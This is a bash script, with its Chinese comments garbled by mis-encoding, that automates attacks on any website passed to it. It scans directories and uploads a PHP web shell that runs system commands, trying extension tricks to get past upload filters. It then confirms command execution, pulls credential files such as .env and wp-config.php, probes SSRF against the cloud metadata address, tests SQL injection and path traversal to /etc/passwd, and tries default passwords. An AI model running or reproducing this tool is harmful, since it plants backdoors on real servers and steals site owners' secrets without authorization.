#!/bin/bash
# æ”¹è¿›ç‰ˆæ·±åº¦æµ‹è¯•è„šæœ¬ - è§£å†³æ‰€æœ‰é—®é¢˜

TARGET="$1"
OUT_DIR="/root/manual_test/results"
mkdir -p "$OUT_DIR"

echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo "ğŸ¯ æ·±åº¦æµ‹è¯•: $TARGET"
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"

# æ ‡å‡†åŒ–URL
if [[ ! "$TARGET" =~ ^https?:// ]]; then
    TARGET="https://$TARGET"
fi
DOMAIN=$(echo "$TARGET" | sed 's|^https\?://||' | cut -d/ -f1 | cut -d: -f1)
FLAG=$(echo "$TARGET" | md5sum | cut -c1-8)

RESULT_FILE="$OUT_DIR/${DOMAIN}_shells.txt"
> "$RESULT_FILE"

WORK_DIR="/tmp/test_${FLAG}"
mkdir -p "$WORK_DIR"

# å‡½æ•°ï¼šæå–shell URLï¼ˆæ”¯æŒJSON/XML/Location/ç›¸å¯¹è·¯å¾„ï¼‰
extract_shell_url() {
    local resp="$1"
    local base_url="$2"
    
    # 1. JSONæ ¼å¼: {"file":"/uploads/shell.php"} æˆ– {"url":"http://..."}
    echo "$resp" | grep -oE '"(file|url|path|location|src)":\s*"([^"]+\.(php|phtml|php5|aspx|jsp))"' | \
        sed 's/.*":\s*"\(.*\)"/\1/' | while read url; do
            [[ "$url" =~ ^http ]] && echo "$url" || echo "${base_url}${url#/}"
        done
    
    # 2. XMLæ ¼å¼: <url>/files/shell.php</url>
    echo "$resp" | grep -oE '<(url|file|path|location)>([^<]+\.(php|phtml|php5|aspx|jsp))</' | \
        sed 's/.*>\(.*\)</\1/' | while read url; do
            [[ "$url" =~ ^http ]] && echo "$url" || echo "${base_url}${url#/}"
        done
    
    # 3. å®Œæ•´URL
    echo "$resp" | grep -oE "(http[s]?://[^\"' ]+\.(php|phtml|php5|aspx|jsp))"
    
    # 4. ç›¸å¯¹è·¯å¾„: uploads/2025/shell.php
    echo "$resp" | grep -oE "(uploads|files|images|media|attachments)/[^\"' ]+\.(php|phtml|php5|aspx|jsp)" | \
        while read rel_path; do
            echo "${base_url}/${rel_path}"
        done
    
    # 5. ç»å¯¹è·¯å¾„: /uploads/shell.php
    echo "$resp" | grep -oE "(/[^\"' ]+/(uploads|files|images|media|attachments)/[^\"' ]+\.(php|phtml|php5|aspx|jsp))" | \
        while read abs_path; do
            echo "${base_url}${abs_path}"
        done
}

# å‡½æ•°ï¼šéªŒè¯shellæ˜¯å¦çœŸçš„å¯ç”¨
verify_shell() {
    local shell_url="$1"
    local test_cmd="echo%20${FLAG}"
    
    # æµ‹è¯•1: GETå‚æ•°
    test_resp=$(curl -skL -m 5 "${shell_url}?0=${test_cmd}" 2>/dev/null)
    if echo "$test_resp" | grep -q "${FLAG}"; then
        echo "[âœ… ShelléªŒè¯æˆåŠŸ] $shell_url"
        return 0
    fi
    
    # æµ‹è¯•2: POSTå‚æ•°
    test_resp=$(curl -skL -m 5 -X POST "$shell_url" -d "0=${test_cmd}" 2>/dev/null)
    if echo "$test_resp" | grep -q "${FLAG}"; then
        echo "[âœ… ShelléªŒè¯æˆåŠŸ] $shell_url"
        return 0
    fi
    
    return 1
}

echo "[é˜¶æ®µ1/5] ğŸ” ç›®å½•æ‰«æå‘ç°çœŸå®è·¯å¾„..."
SCAN_FILE="$WORK_DIR/dir_scan.txt"
> "$SCAN_FILE"

# ä½¿ç”¨å¸¸è§ç›®å½•å­—å…¸
COMMON_DIRS="/admin /administrator /wp-admin /wp-login.php /phpmyadmin /cpanel /manager /control /panel /dashboard /backend /login /api /upload /fileupload /files /uploads /images /media /attachments /includes /modules /components /assets /static /public /private /secure /admin/upload /admin/files /includes/upload /modules/upload /components/upload /api/upload /api/file /api/files /rest/upload /v1/upload /v2/upload"

for dir in $COMMON_DIRS; do
    status=$(curl -skL -m 3 -o /dev/null -w "%{http_code}" "${TARGET}${dir}" 2>/dev/null)
    if [ "$status" = "200" ] || [ "$status" = "301" ] || [ "$status" = "302" ] || [ "$status" = "403" ] || [ "$status" = "401" ]; then
        echo "${TARGET}${dir}|${status}" >> "$SCAN_FILE"
    fi
done

# å¦‚æœffufå¯ç”¨ï¼Œè¿›è¡Œæ·±åº¦æ‰«æ
if command -v ffuf &> /dev/null; then
    echo "  ä½¿ç”¨ffufæ·±åº¦æ‰«æ..."
    ffuf -u "${TARGET}/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt \
        -mc 200,301,302,403,401 -t 50 -s -o "$WORK_DIR/ffuf.json" -of json 2>/dev/null | \
        jq -r '.results[]? | "\(.url)|\(.status)"' 2>/dev/null >> "$SCAN_FILE" || true
fi

echo "[é˜¶æ®µ2/5] ğŸ“„ åˆ†æé¡µé¢ç»“æ„æå–åŠŸèƒ½ç‚¹..."
PAGE_LINKS="$WORK_DIR/page_links.txt"
> "$PAGE_LINKS"

# æå–ä¸»é¡µæ‰€æœ‰é“¾æ¥
curl -skL -m 5 "$TARGET" 2>/dev/null | \
    grep -oE 'href=["'\'']([^"'\'']+)["'\'']|src=["'\'']([^"'\'']+)["'\'']' | \
    sed 's/href=["'\'']\(.*\)["'\'']/\1/' | sed 's/src=["'\'']\(.*\)["'\'']/\1/' | \
    grep -E '^/|^http' | sort -u >> "$PAGE_LINKS"

# æå–JSæ–‡ä»¶ä¸­çš„APIç«¯ç‚¹
curl -skL -m 5 "$TARGET" 2>/dev/null | \
    grep -oE 'src=["'\'']([^"'\'']+\.js)["'\'']' | \
    sed 's/.*src=["'\'']\(.*\)["'\'']/\1/' | while read js_path; do
        [[ "$js_path" =~ ^http ]] || js_path="${TARGET}/${js_path#/}"
        curl -skL -m 5 "$js_path" 2>/dev/null | \
            grep -oE '/api/[a-zA-Z0-9/_-]+|/upload|/file|/files' | sort -u >> "$PAGE_LINKS"
    done

UPLOAD_PATHS=$(cat "$SCAN_FILE" "$PAGE_LINKS" 2>/dev/null | grep -iE "upload|file|upload" | cut -d'|' -f1 | sort -u | head -20)
echo "  å‘ç° ${#UPLOAD_PATHS[@]} ä¸ªæ½œåœ¨ä¸Šä¼ è·¯å¾„"

echo "[é˜¶æ®µ3/5] ğŸ“¤ æ–‡ä»¶ä¸Šä¼ æµ‹è¯•ï¼ˆ10+ç§ç»•è¿‡ï¼‰..."
UPLOAD_BYPASSES=(
    "php"
    "phtml"
    "php5"
    "php3"
    "phar"
    "PhP"
    "pHp"
    "php."
    "php%00.jpg"
    "php.jpg"
    "php.jpeg"
    "php.png"
    "php.gif"
    "php%00"
    "php "
    "php%0a"
)

for upload_path in $UPLOAD_PATHS; do
    [ -z "$upload_path" ] && continue
    
    for bypass_ext in "${UPLOAD_BYPASSES[@]}"; do
        tmp_file="$WORK_DIR/u_${FLAG}.${bypass_ext}"
        printf '%s\n' "<?php echo \"U${FLAG}\";@system(\$_GET[0]); ?>" > "$tmp_file"
        
        # æµ‹è¯•å¤šç§POSTå‚æ•°å
        for param_name in file upload fileupload image photo attachment document; do
            # æ ‡å‡†multipart
            resp=$(curl -skL -m 10 -X POST "$upload_path" \
                -F "${param_name}=@$tmp_file" \
                -F "upload=@$tmp_file" \
                -F "fileType=Photo" \
                -H "User-Agent: Mozilla/5.0" \
                -w "\n%{http_code}\n%{redirect_url}\n" 2>&1)
            
            http_code=$(echo "$resp" | tail -2 | head -1)
            redirect_url=$(echo "$resp" | tail -1)
            resp_body=$(echo "$resp" | head -n -2)
            
            # æ£€æŸ¥HTTPçŠ¶æ€ç 
            if [ "$http_code" = "200" ] || [ "$http_code" = "201" ] || [ "$http_code" = "302" ]; then
                # æå–shell URLï¼ˆæ”¯æŒæ‰€æœ‰æ ¼å¼ï¼‰
                shell_urls=$(extract_shell_url "$resp_body" "$TARGET")
                
                # å¦‚æœæœ‰Locationå¤´
                if [ -n "$redirect_url" ] && [[ "$redirect_url" =~ \.(php|phtml|php5|aspx|jsp)$ ]]; then
                    shell_urls="$shell_urls
$redirect_url"
                fi
                
                # éªŒè¯æ¯ä¸ªshell
                echo "$shell_urls" | grep -v "^$" | while read shell_url; do
                    if verify_shell "$shell_url"; then
                        echo "[âœ… æ–‡ä»¶ä¸Šä¼ æˆåŠŸ] $shell_url (è·¯å¾„: $upload_path, ç»•è¿‡: $bypass_ext)" | tee -a "$RESULT_FILE"
                    fi
                done
            fi
        done
    done
done
rm -f "$WORK_DIR"/u_*

echo "[é˜¶æ®µ4/5] ğŸ”“ æ•æ„Ÿæ–‡ä»¶æ³„éœ²ï¼ˆä¿®å¤è¯¯æŠ¥ï¼‰..."
for file in .env .env.local .env.production config.php wp-config.php configuration.php database.yml application.properties web.config .git/config .git/HEAD .DS_Store; do
    resp=$(curl -skL -m 5 "$TARGET/$file" 2>/dev/null)
    http_code=$(curl -skL -m 5 -o /dev/null -w "%{http_code}" "$TARGET/$file" 2>/dev/null)
    
    # ä¿®å¤ï¼šæ’é™¤404é¡µé¢
    if [ "$http_code" = "200" ] && [ ${#resp} -gt 50 ]; then
        # æ£€æŸ¥æ˜¯å¦çœŸçš„æ˜¯æ•æ„Ÿæ–‡ä»¶ï¼ˆä¸æ˜¯404é¡µé¢ï¼‰
        if ! echo "$resp" | grep -qiE "404|not found|error 404"; then
            if echo "$resp" | grep -qiE "password|secret|api[_-]?key|db[_-]?pass|mysql|database|connection"; then
                echo "[âœ… æ•æ„Ÿæ–‡ä»¶æ³„éœ²] $TARGET/$file" | tee -a "$RESULT_FILE"
                echo "$resp" | head -30 >> "$RESULT_FILE"
            fi
        fi
    fi
done

echo "[é˜¶æ®µ5/5] ğŸ”Œ æœªæˆæƒAPI + å…¶ä»–æµ‹è¯•..."
# ä»æ‰«æç»“æœä¸­æå–APIè·¯å¾„
API_PATHS=$(cat "$SCAN_FILE" 2>/dev/null | grep -iE "api|rest|graphql|swagger" | cut -d'|' -f1 | head -20)

for api in $API_PATHS; do
    [ -z "$api" ] && continue
    resp=$(curl -skL -m 5 "$api" 2>/dev/null)
    if [ ${#resp} -gt 10 ] && echo "$resp" | grep -qE "\{|\["; then
        if ! echo "$resp" | grep -qiE "login|unauthorized|forbidden|401|403"; then
            echo "[âœ… æœªæˆæƒAPI] $api" | tee -a "$RESULT_FILE"
        fi
    fi
done

# Gitæ³„éœ²
for git_path in .git/config .git/HEAD .git/index; do
    resp=$(curl -skL -m 5 "$TARGET/$git_path" 2>/dev/null)
    if echo "$resp" | grep -qE "\[core\]|ref:|commit"; then
        echo "[âœ… Gitæ³„éœ²] $TARGET/$git_path" | tee -a "$RESULT_FILE"
    fi
done

# SSRF
for ssrf_path in /api/fetch /api/proxy /api/download /api/curl; do
    resp=$(curl -skL -m 5 "$TARGET${ssrf_path}?url=http://169.254.169.254/latest/meta-data/" 2>/dev/null)
    if echo "$resp" | grep -qiE "instance-id|ami-id|access"; then
        echo "[âœ… SSRFæˆåŠŸ] $TARGET${ssrf_path}" | tee -a "$RESULT_FILE"
    fi
done

# SQLæ³¨å…¥
params=$(echo "$TARGET" | grep -oE "[?&][a-zA-Z0-9_]+=" | sed 's/[?&]//g' | sed 's/=//g' | sort -u)
if [ -z "$params" ]; then
    params="id user page cat"
fi
for param in $params; do
    resp=$(curl -skL -m 5 "$TARGET?${param}=1'" 2>/dev/null)
    if echo "$resp" | grep -qiE "mysql|postgresql|sql syntax|sql error"; then
        echo "[âœ… SQLæ³¨å…¥] $TARGET?${param}=1'" | tee -a "$RESULT_FILE"
    fi
done

# å¼±å£ä»¤ï¼ˆä»æ‰«æç»“æœä¸­æå–ç™»å½•è·¯å¾„ï¼‰
LOGIN_PATHS=$(cat "$SCAN_FILE" 2>/dev/null | grep -iE "login|admin|wp-login|administrator" | cut -d'|' -f1 | head -10)
for login_path in $LOGIN_PATHS; do
    [ -z "$login_path" ] && continue
    for cred in "admin:admin" "admin:123456" "root:root" "administrator:password"; do
        user=$(echo $cred | cut -d: -f1)
        pass=$(echo $cred | cut -d: -f2)
        resp=$(curl -skL -m 5 -X POST "$login_path" \
            -d "username=$user&password=$pass" \
            -d "user=$user&pass=$pass" \
            -d "log=$user&pwd=$pass" \
            -L 2>/dev/null)
        if echo "$resp" | grep -qiE "dashboard|welcome|logout|success" && ! echo "$resp" | grep -qiE "error|invalid|failed"; then
            echo "[âœ… å¼±å£ä»¤] $login_path ($user:$pass)" | tee -a "$RESULT_FILE"
        fi
    done
done

# LFI
for param in file path page include; do
    resp=$(curl -skL -m 5 "$TARGET?${param}=../../../../etc/passwd" 2>/dev/null)
    if echo "$resp" | grep -qE "root:.*:0:0:"; then
        echo "[âœ… LFIæˆåŠŸ] $TARGET?${param}" | tee -a "$RESULT_FILE"
    fi
done

shell_count=$(wc -l < "$RESULT_FILE" 2>/dev/null || echo 0)
echo ""
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo "âœ… $DOMAIN æµ‹è¯•å®Œæˆï¼Œå‘ç° $shell_count ä¸ªç»“æœ"
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
if [ "$shell_count" -gt 0 ]; then
    cat "$RESULT_FILE"
fi

rm -rf "$WORK_DIR"
